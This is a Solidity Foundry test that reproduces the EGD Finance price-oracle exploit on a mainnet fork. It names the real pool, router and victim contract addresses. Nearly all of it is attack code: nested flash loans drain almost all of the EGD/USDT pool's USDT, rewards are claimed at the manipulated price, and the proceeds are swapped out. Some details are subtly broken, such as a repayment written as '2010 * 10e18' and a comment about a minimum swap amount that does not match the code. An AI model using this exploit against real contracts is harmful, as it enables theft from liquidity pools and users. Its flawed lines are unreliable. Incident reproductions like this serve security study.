// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interfaces/IPancakePair.sol";
import "./interfaces/IPancakeRouter.sol";
import "./interfaces/IEGD_Finance.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/cheat.sol";

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// 宣告全局變量, 必須為 constant 類型
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻擊合約
    uint256 borrow1;
    uint256 borrow2;

    constructor() {
        cheat.deal(address(this), 1000e18 ether);
    }

    function stake() public {
    // Step 1: Wrap 1 BNB → 1 WBNB
    IWBNB(wbnb).deposit{value: 1e18}();
    console.log("[Stake] Wrapped 1 BNB to 1 WBNB");

    // Step 2: Bond (设置邀请人，攻击中必要步骤)
    IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
    console.log("[Stake] Bond completed");

    // Step 3: Approve WBNB to PancakeRouter
    IERC20(wbnb).approve(address(pancakeRouter), type(uint256).max);
    console.log("[Stake] Approved WBNB to PancakeRouter");

    // Step 4: 查看当前池子储备，用于调试（强烈建议保留）
    (uint256 reserveUSDT, uint256 reserveWBNB, ) = USDT_WBNB_LPPool.getReserves();
    console.log("[Debug] USDT reserve:", reserveUSDT / 1e18);
    console.log("[Debug] WBNB reserve:", reserveWBNB / 1e18);

    // Step 5: 用全部 1 WBNB 换 USDT，设置合理的 amountOutMin
    // 保守估计：扣除 0.25% 手续费 + 少量滑点，预期能换到 ~830-840 USDT
    // 所以 amountOutMin 设为 800 USDT 是非常安全的
    address[] memory path = new address[](2);
    path[0] = wbnb;
    path[1] = usdt;

    uint256 expectedMinUSDT = 200 * 1e18;  // 安全值，可根据上面 debug 调整

    IPancakeRouter(pancakeRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1e18}(
        expectedMinUSDT,
        path,
        address(this),
        block.timestamp + 300
    );

    // Step 6: 查看实际换到的 USDT
    uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));
    console.log("[Stake] Received USDT after swap:", usdtBalance / 1e18);

    // Step 7: Approve & Stake
    IERC20(usdt).approve(EGD_Finance, type(uint256).max);
    
    // 只 stake 100 USDT（合约要求最小 100），剩余留着也没事
    IEGD_Finance(EGD_Finance).stake(100 * 1e18);
    
    console.log("[Stake] Successfully staked 100 USDT");
    console.log("[Stake] Remaining USDT:", IERC20(usdt).balanceOf(address(this)) / 1e18);
}

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");
            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //攻擊者借出 EGD_USDT_LPPool 的 99.99999925% USDT 流動性
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻擊者還款 2,000 USDT + 0.5% 服務費
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}

contract Attacker is Test { // 模擬的攻擊者(EOA)
    Exploit exploit = new Exploit();

    constructor() { // 也可以寫成 function setUp() public {}
        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        vm.rollFork(20245538);
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }

    function testExploit() public { // 必須為 test 開頭命名, 才能被 Foundry 執行 testcase
        // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.stake(); //模擬 EOA 呼叫攻擊合約
        exploit.harvest(); //模擬 EOA 呼叫攻擊合約
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}